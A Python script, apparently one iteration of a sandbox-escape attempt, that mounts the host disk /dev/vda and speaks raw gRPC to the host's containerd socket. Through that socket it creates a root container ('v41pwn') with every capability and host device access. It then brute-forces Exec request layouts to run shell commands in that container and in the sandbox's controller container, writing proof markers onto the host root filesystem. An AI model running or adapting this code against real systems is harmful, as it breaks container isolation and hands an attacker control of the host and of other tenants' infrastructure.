# -*- coding: utf-8 -*-
"""vda41_exec_combo: Exec 精确组合测试 (v40 确认 field7=exec_id)
v40 结论: f1=container_id, f3=Any(spec), f7=exec_id(string, 有格式验证)
         'probe40_f7' 通过验证走到 shim 层 (ttrpc: closed)
P0: mount /dev/vda -> /mnt/vdax
P1: Containers/List -> ctrl id + snap_key
P2: 创建 v41pwn + Tasks/Create + Start
P3: Exec 组合测试 (全部对 v41pwn):
  T0: f1 + f7('ex41a')                        -> 基线
  T1: T0 + f3(Any spec /bin/true)             -> 标准布局
  T2: T1 + f6(1)                              -> varint 字段
  T3: T1 + f6(1)+f4(1)+f5(1)                  -> bool 组合
  T4: T1 + f4(1)+f5(1)                        -> 不含 f6
  T5: T1 + f2('probe')                        -> f2 string 影响?
  T6: T1 + f2('probe')+f4(1)+f5(1)+f6(1)      -> 全组合
  T7: f1 + f7 + f2('/bin/sh')+f4(1)+f5(1)+f6(1)  -> 若 f2 是命令字段
  每个 T 记录 grpc-status/message
P4: 若任一 T 成功 (status 0): 用写 marker 的 spec 重试 + Start + 验证
P5: 对 ctrl 容器尝试成功组合
输出落盘 + 哨兵 V41S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v41s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:300]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3)) + (b'\x01' if v else b'\x00')


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
CID = 'v41pwn'
TASKDIR = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID
EXID = 'ex41a'


def p1():
    log('=== P1 list ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s' % rc)
    m = re.search(rb'\$([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', out)
    ctrl = m.group(1).decode() if m else None
    log('ctrl container id = %s' % ctrl)
    m2 = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out)
    sk = m2.group().decode() if m2 else None
    log('snap_key=%s' % sk)
    return ctrl, sk


def make_spec(args):
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    return {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": args,
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V41_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v41pwn-ctr",
            "namespaces": [
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }


def p2(sk):
    log('=== P2 Create v41pwn ===')
    spec = make_spec(["/bin/sh", "-c", "sleep 99999"])
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec)
    ctr += pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=6)
    log('Containers/Create %s' % rc)
    if 'grpc-status: 0' not in rc:
        return False
    req = pstr(1, CID)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=8)
    log('Tasks/Create %s' % rc)
    if 'grpc-status: 0' not in rc:
        return False
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
    log('Tasks/Start %s' % rc)
    return 'grpc-status: 0' in rc


def classify(rc):
    m = re.search(r'grpc-status: (\d+)', rc)
    s = m.group(1) if m else '?'
    m = re.search(r'grpc-message: ([^|]*)', rc)
    msg = m.group(1).strip() if m else ''
    return s, msg


def exec_req(extra=b''):
    return grpc_env(pstr(1, CID) + pstr(7, EXID) + extra)


def run_exec(tag, body, t=8):
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(body), t=t)
    s, msg = classify(rc)
    log('%-14s status=%s msg=%s' % (tag, s, msg[:130]))
    return rc, out, s, msg


def any_process(args, marker):
    proc = {"user": {"uid": 0, "gid": 0},
            "args": args,
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/", "terminal": False}
    return pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, json.dumps(proc).encode())


def p3():
    log('=== P3 Exec combo tests ===')
    ap = any_process(["/bin/true"], '')
    tests = [
        ('T0 base',       pstr(1, CID) + pstr(7, EXID)),
        ('T1 +f3spec',    pstr(1, CID) + pstr(7, EXID) + pmsg(3, ap)),
        ('T2 +f3+f6',     pstr(1, CID) + pstr(7, EXID) + pmsg(3, ap) + pbool(6, True)),
        ('T3 +f3+f6+4+5', pstr(1, CID) + pstr(7, EXID) + pmsg(3, ap) + pbool(6, True) + pbool(4, True) + pbool(5, True)),
        ('T4 +f3+4+5',    pstr(1, CID) + pstr(7, EXID) + pmsg(3, ap) + pbool(4, True) + pbool(5, True)),
        ('T5 +f2str',     pstr(1, CID) + pstr(7, EXID) + pmsg(3, ap) + pstr(2, 'probe41')),
        ('T6 full',       pstr(1, CID) + pstr(7, EXID) + pmsg(3, ap) + pstr(2, 'probe41') + pbool(4, True) + pbool(5, True) + pbool(6, True)),
        ('T7 f2cmd',      pstr(1, CID) + pstr(7, EXID) + pstr(2, '/bin/sh') + pbool(4, True) + pbool(5, True) + pbool(6, True)),
    ]
    ok = {}
    for tag, body in tests:
        rc, out, s, msg = run_exec(tag, body)
        if s == '0':
            ok[tag] = True
            log('*** %s SUCCESS ***' % tag)
        time.sleep(0.4)
    return ok


def p4(tag_ok):
    log('=== P4 exec marker ===')
    ap = any_process(["/bin/sh", "-c",
                      "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                      "echo v41-exec-ok $(date) >> /mnt/root/.v41_exec_marker 2>/dev/null; "
                      "sleep 3"], '')
    # 用 T1 布局 + marker 命令 (最可能的标准布局)
    body = pstr(1, CID) + pstr(7, EXID) + pmsg(3, ap)
    rc, out, s, msg = run_exec('P4 exec', body)
    if s == '0':
        # Start: 尝试标准布局 container_id=1, exec_id=2
        for sf, ei in [(2, EXID), (7, EXID), (1, EXID)]:
            req = pstr(1, CID) + pstr(sf, ei) if sf != 1 else pstr(1, EXID)
            # 若 sf==1 则只有 field1=exec_id
            if sf == 1:
                req = pstr(1, EXID)
            rc2, out2 = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
            s2, msg2 = classify(rc2)
            log('Start(exec sf=%d) status=%s msg=%s' % (sf, s2, msg2[:100]))
            if s2 == '0':
                log('*** START OK with sf=%d ***' % sf)
                break
        time.sleep(3)
        try:
            mk = '/mnt/vdax/root/.v41_exec_marker'
            log('v41 exec marker: %s' % (os.path.exists(mk) and open(mk).read().strip() or 'MISSING'))
        except Exception as e:
            log('marker ERR %s' % e)
    else:
        log('P4 exec failed, skip start')


def p5(ctrl):
    log('=== P5 ctrl exec ===')
    if not ctrl:
        log('no ctrl, skip')
        return
    ap = any_process(["/bin/sh", "-c",
                      "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                      "echo v41-ctrl-exec-ok $(date) >> /mnt/root/.v41_ctrl_marker 2>/dev/null; "
                      "sleep 3"], '')
    body = pstr(1, ctrl) + pstr(7, EXID) + pmsg(3, ap)
    rc, out, s, msg = run_exec('ctrl exec', body)
    if s == '0':
        req = pstr(1, ctrl) + pstr(2, EXID)
        rc2, out2 = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
        s2, msg2 = classify(rc2)
        log('ctrl Start status=%s msg=%s' % (s2, msg2[:100]))
        time.sleep(3)
        try:
            mk = '/mnt/vdax/root/.v41_ctrl_marker'
            log('ctrl marker: %s' % (os.path.exists(mk) and open(mk).read().strip() or 'MISSING'))
        except Exception as e:
            log('ctrl marker ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    ctrl, sk = p1()
    ok = p2(sk)
    if ok:
        p3()
        p4(None)
        p5(ctrl)
    else:
        log('v41pwn create failed, skip')

    log('V41S_DONE')
    f.close()


if __name__ == '__main__':
    main()
